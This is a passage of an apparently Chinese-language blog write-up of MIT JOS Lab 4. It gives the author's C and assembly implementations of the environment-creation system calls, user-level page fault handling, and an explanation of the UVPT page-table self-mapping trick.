src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310082226355.png"></p><h4 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h4><h4 id="System-Calls-for-Environment-Creation"><a href="#System-Calls-for-Environment-Creation" class="headerlink" title="System Calls for Environment Creation"></a>System Calls for Environment Creation</h4><p>几个系统调用,需要检查的东西都列出来了,挨着做就行了.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Allocate a new environment.</span></span><br><span class="line"><span class="comment">// Returns envid of new environment, or &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_NO_FREE_ENV if no free environment is available.</span></span><br><span class="line"><span class="comment">//-E_NO_MEM on memory exhaustion.</span></span><br><span class="line"><span class="type">static</span> <span class="type">envid_t</span></span><br><span class="line"><span class="title function_">sys_exofork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>((result = env_alloc(&amp;e,curenv-&gt;env_id)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;e-&gt;env_tf,&amp;curenv-&gt;env_tf,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe));</span><br><span class="line">e-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">e-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> e-&gt;env_id;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set envid's env_status to status, which must be ENV_RUNNABLE</span></span><br><span class="line"><span class="comment">// or ENV_NOT_RUNNABLE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if status is not a valid status for an environment.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_status</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">int</span> status)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">if</span>((result=envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(status!=ENV_RUNNABLE&amp;&amp;status!=ENV_NOT_RUNNABLE)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_status = status;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page of memory and map it at 'va' with permission</span></span><br><span class="line"><span class="comment">// 'perm' in the address space of 'envid'.</span></span><br><span class="line"><span class="comment">// The page's contents are set to 0.</span></span><br><span class="line"><span class="comment">// If a page is already mapped at 'va', that page is unmapped as a</span></span><br><span class="line"><span class="comment">// side effect.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// perm -- PTE_U | PTE_P must be set, PTE_AVAIL | PTE_W may or may not be set,</span></span><br><span class="line"><span class="comment">//         but no other bits may be set.  See PTE_SYSCALL in inc/mmu.h.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if va &gt;= UTOP, or va is not page-aligned.</span></span><br><span class="line"><span class="comment">//-E_INVAL if perm is inappropriate (see above).</span></span><br><span class="line"><span class="comment">//-E_NO_MEM if there's no memory to allocate the new page,</span></span><br><span class="line"><span class="comment">//or to allocate any necessary page tables.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_alloc</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *va, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">if</span>((perm|PTE_SYSCALL)!=PTE_SYSCALL)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(va&gt;=(<span class="type">void</span>*)UTOP||va!=ROUNDDOWN(va,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(page = page_alloc(ALLOC_ZERO)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">}</span><br><span class="line">page_insert(e-&gt;env_pgdir,page,va,perm);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Map the page of memory at 'srcva' in srcenvid's address space</span></span><br><span class="line"><span class="comment">// at 'dstva' in dstenvid's address space with permission 'perm'.</span></span><br><span class="line"><span class="comment">// Perm has the same restrictions as in sys_page_alloc, except</span></span><br><span class="line"><span class="comment">// that it also must not grant write access to a read-only</span></span><br><span class="line"><span class="comment">// page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if srcenvid and/or dstenvid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change one of them.</span></span><br><span class="line"><span class="comment">//-E_INVAL if srcva &gt;= UTOP or srcva is not page-aligned,</span></span><br><span class="line"><span class="comment">//or dstva &gt;= UTOP or dstva is not page-aligned.</span></span><br><span class="line"><span class="comment">//-E_INVAL is srcva is not mapped in srcenvid's address space.</span></span><br><span class="line"><span class="comment">//-E_INVAL if perm is inappropriate (see sys_page_alloc).</span></span><br><span class="line"><span class="comment">//-E_INVAL if (perm &amp; PTE_W), but srcva is read-only in srcenvid's</span></span><br><span class="line"><span class="comment">//address space.</span></span><br><span class="line"><span class="comment">//-E_NO_MEM if there's no memory to allocate any necessary page tables.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_map</span><span class="params">(<span class="type">envid_t</span> srcenvid, <span class="type">void</span> *srcva,</span></span><br><span class="line"><span class="params">     <span class="type">envid_t</span> dstenvid, <span class="type">void</span> *dstva, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">srcenv</span>,*<span class="title">dstenv</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">pte_t</span>* srcpte,*dstpte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">srcpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(srcva&gt;=(<span class="type">void</span>*)UTOP||srcva!=ROUNDDOWN(srcva,PGSIZE)||dstva&gt;=(<span class="type">void</span>*)UTOP||dstva!=ROUNDDOWN(dstva,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((perm|PTE_SYSCALL)!=PTE_SYSCALL)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(srcenvid,&amp;srcenv,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(dstenvid,&amp;dstenv,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(srcpage = page_lookup(srcenv-&gt;env_pgdir,srcva,&amp;srcpte)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(((*srcpte)&amp;PTE_W)==<span class="number">0</span>&amp;&amp;((perm&amp;PTE_W)!=<span class="number">0</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((result = page_insert(dstenv-&gt;env_pgdir,srcpage,dstva,perm)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmap the page of memory at 'va' in the address space of 'envid'.</span></span><br><span class="line"><span class="comment">// If no page is mapped, the function silently succeeds.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="comment">//-E_INVAL if va &gt;= UTOP, or va is not page-aligned.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_page_unmap</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *va)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(va&gt;=(<span class="type">void</span>*)UTOP||va!=ROUNDDOWN(va,PGSIZE))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">page_remove(e-&gt;env_pgdir,va);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Part-B-Copy-on-Write-Fork"><a href="#Part-B-Copy-on-Write-Fork" class="headerlink" title="Part B: Copy-on-Write Fork"></a>Part B: Copy-on-Write Fork</h3><h4 id="User-level-page-fault-handling"><a href="#User-level-page-fault-handling" class="headerlink" title="User-level page fault handling"></a>User-level page fault handling</h4><h5 id="Setting-the-Page-Fault-Handler"><a href="#Setting-the-Page-Fault-Handler" class="headerlink" title="Setting the Page Fault Handler"></a>Setting the Page Fault Handler</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set the page fault upcall for 'envid' by modifying the corresponding struct</span></span><br><span class="line"><span class="comment">// Env's 'env_pgfault_upcall' field.  When 'envid' causes a page fault, the</span></span><br><span class="line"><span class="comment">// kernel will push a fault record onto the exception stack, then branch to</span></span><br><span class="line"><span class="comment">// 'func'.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span></span><br><span class="line"><span class="comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span></span><br><span class="line"><span class="comment">//or the caller doesn't have permission to change envid.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_pgfault_upcall</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">void</span> *func)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">1</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_pgfault_upcall = func;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Invoking-the-User-Page-Fault-Handler"><a href="#Invoking-the-User-Page-Fault-Handler" class="headerlink" title="Invoking the User Page Fault Handler"></a>Invoking the User Page Fault Handler</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_fault_handler</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> fault_va;</span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((tf-&gt;tf_cs&amp;<span class="number">3</span>)==<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"kernel pagefalut\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(curenv-&gt;env_pgfault_upcall==<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> recursive = (tf-&gt;tf_esp &gt;= UXSTACKTOP - PGSIZE) &amp;&amp; (tf-&gt;tf_esp &lt; UXSTACKTOP);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UTrapframe</span>* <span class="title">utf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(recursive)</span><br><span class="line">{</span><br><span class="line">utf = (<span class="keyword">struct</span> UTrapframe*)(tf-&gt;tf_esp-<span class="keyword">sizeof</span>(<span class="keyword">struct</span> UTrapframe)-<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line"><span class="comment">// cprintf("recursive\n");</span></span><br><span class="line">user_mem_assert(curenv,utf,tf-&gt;tf_esp-(<span class="type">uint32_t</span>)utf,PTE_W);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">utf = (<span class="keyword">struct</span> UTrapframe*)(UXSTACKTOP-<span class="keyword">sizeof</span>(<span class="keyword">struct</span> UTrapframe));</span><br><span class="line"><span class="comment">// cprintf("non-recursive\n");</span></span><br><span class="line">user_mem_assert(curenv,utf,UXSTACKTOP-(<span class="type">uint32_t</span>)utf,PTE_W);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">utf-&gt;utf_esp = tf-&gt;tf_esp; </span><br><span class="line">utf-&gt;utf_eflags = tf-&gt;tf_eflags;</span><br><span class="line">utf-&gt;utf_regs = tf-&gt;tf_regs;</span><br><span class="line">utf-&gt;utf_err = tf-&gt;tf_err;</span><br><span class="line">utf-&gt;utf_eip = tf-&gt;tf_eip;</span><br><span class="line">utf-&gt;utf_fault_va = fault_va;</span><br><span class="line"></span><br><span class="line">tf-&gt;tf_esp = (<span class="type">uintptr_t</span>)utf;</span><br><span class="line">tf-&gt;tf_eip = (<span class="type">uint32_t</span>)curenv-&gt;env_pgfault_upcall;</span><br><span class="line">env_run(curenv);</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">"[%08x] user fault va %08x ip %08x\n"</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="User-mode-Page-Fault-Entrypoint"><a href="#User-mode-Page-Fault-Entrypoint" class="headerlink" title="User-mode Page Fault Entrypoint"></a>User-mode Page Fault Entrypoint</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl _pgfault_upcall</span><br><span class="line">_pgfault_upcall:</span><br><span class="line">// Call the C page fault handler.</span><br><span class="line">pushl %esp// function argument: pointer to UTF</span><br><span class="line">movl _pgfault_handler, %eax</span><br><span class="line">call *%eax</span><br><span class="line">addl $4, %esp// pop function argument</span><br><span class="line"></span><br><span class="line">movl 40(%esp),%ebx //取出trap_eip</span><br><span class="line">subl $4,48(%esp) //抬高栈4字节,此空间为trap_eip的返回地址</span><br><span class="line">movl 48(%esp),%eax //取出trap_esp</span><br><span class="line">movl %ebx,(%eax) </span><br><span class="line"></span><br><span class="line">addl $8,%esp //跳过err和fault_va</span><br><span class="line"></span><br><span class="line">popal //restore the trap-time registers</span><br><span class="line"></span><br><span class="line">addl $4,%esp //跳过trap_eip</span><br><span class="line">popf</span><br><span class="line"></span><br><span class="line">     popl %esp</span><br><span class="line">ret</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">set_pgfault_handler</span><span class="params">(<span class="type">void</span> (*handler)(<span class="keyword">struct</span> UTrapframe *utf))</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_pgfault_handler == <span class="number">0</span>) {</span><br><span class="line"><span class="comment">// First time through!</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">envid_t</span> eid = sys_getenvid();</span><br><span class="line"><span class="keyword">if</span>(sys_page_alloc(eid,(<span class="type">void</span>*)(UXSTACKTOP-PGSIZE),PTE_W|PTE_U|PTE_P))</span><br><span class="line">{</span><br><span class="line"><span class="comment">//panic("fail\n"); User系统调用失败,凭啥让内核panic?</span></span><br><span class="line">}</span><br><span class="line">sys_env_set_pgfault_upcall(eid,_pgfault_upcall);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save handler pointer for assembly to call.</span></span><br><span class="line">_pgfault_handler = handler;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h4 id="Implementing-Copy-on-Write-Fork"><a href="#Implementing-Copy-on-Write-Fork" class="headerlink" title="Implementing Copy-on-Write Fork"></a>Implementing Copy-on-Write Fork</h4><h5 id="页表-页目录表的映射分析"><a href="#页表-页目录表的映射分析" class="headerlink" title="页表,页目录表的映射分析"></a>页表,页目录表的映射分析</h5><p>实现完用户级页面错误处理例程的安装工作后,下面进入Fork函数的实现.<br>在此之前,先来理解一个<code>clever mapping trick</code>.</p><p>在为环境建立映射的时候,有这样一个操作.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UVPT maps the env's own page table read-only.</span></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">e-&gt;env_pgdir[PDX(UVPT)] = PADDR(e-&gt;env_pgdir) | PTE_P | PTE_U;</span><br></pre></td></tr></tbody></table></figure><p>UVPT的定义如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User read-only virtual page table (see 'uvpt' below)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UVPT(ULIM - PTSIZE)</span></span><br></pre></td></tr></tbody></table></figure><p>根据注释,我们可以理解这一操作是将页目录表自身映射到虚拟地址UVPT,使用户进程可以只读访问.But how does it work?</p><p>先来看这样一个情形.用户态lib的某个函数要检查一个物理页在其页表中的pte条目来判断操作是否合法.自然而然的想法是:通过之前映射的页目录表找到对应的页目录表目中的页表地址,再访问该页表的对应pte条目.</p><p>但问题是,页目录表条目pde中存的是页表的物理地址而不是虚拟地址,没办法访问到对应页表.你可能会想,不对啊,之前在内核态的时候有过访问pte的操作啊.其实是因为之前访问时是先将从页目录表中取出的页表物理地址转换成KVA虚拟地址后再访问的,能完成这样的操作是因为我们曾经将从0开始的物理地址空间映射到了KERNBASE之上.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, KERNBASE, (<span class="number">1ULL</span> &lt;&lt; <span class="number">32</span>) - KERNBASE, <span class="number">0</span>, PTE_W);</span><br></pre></td></tr></tbody></table></figure><p>而用户进程并不具有访问KERNBASE之上虚拟地址空间的能力.</p><p>那用户进程应该怎么访问页表条目呢?页表本身也是一个物理页,而访问一个物理页就需要找到该物理页对应的页表,页表的页表,也就是页目录表.把页目录表当作一个页表,不久能找到页表本身的物理地址了?</p><p>回想一下分页机制的工作.先在页目录表中通过PDX找到页表,再在页表中通过PTX找到物理页.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310111628497.png"><br>那如果我们让页目录表根据PDX找到页目录表自身,页部件就会把页目录表当成页表,再根据PTX找到页表本身的物理地址并进行访问.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310111631565.png"></p><p>理解完这一过程,再来看看如何找到想访问的页表或页表项的地址.<br>对于32位地址addr –&gt; PDX|PTX|OFFSET.</p><p>PDX是页目录表的索引,要让它索引到自身,便固定了得是(UPVT&gt;&gt;22)<br>由于我们将页目录表当作是页表,则PTX同样也用来在页目录表上索引,查找到的物理地址意义为第PTX个页表的物理地址.<br>OFFSET便用于在页表上偏移,页表的内容是页表条目,每个大小4字节,所以OFFSET便是该页表的第OFFSET/4项.</p><p>综合起来,upvt[n]就相当于访问了物理空间第n页的页表条目.<br>upvt[addr&gt;&gt;12]访问的就是addr所在物理页的页表条目.<br>upvd[addr&gt;&gt;22]访问的就是addr对应的页表在页目录表中的条目.<br>这也解释了entry.S中的宏定义.<br>其实挺反直觉的,页目录表映射到UVPT,但访问UVPT却访问到的是第0页的页表.而页目录表要用uvpd去访问(UVPT+(UVPT&gt;&gt;12)*4).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.globl uvpt</span><br><span class="line">.<span class="built_in">set</span> uvpt, UVPT</span><br><span class="line">.globl uvpd</span><br><span class="line">.<span class="built_in">set</span> uvpd, (UVPT+(UVPT&gt;&gt;<span 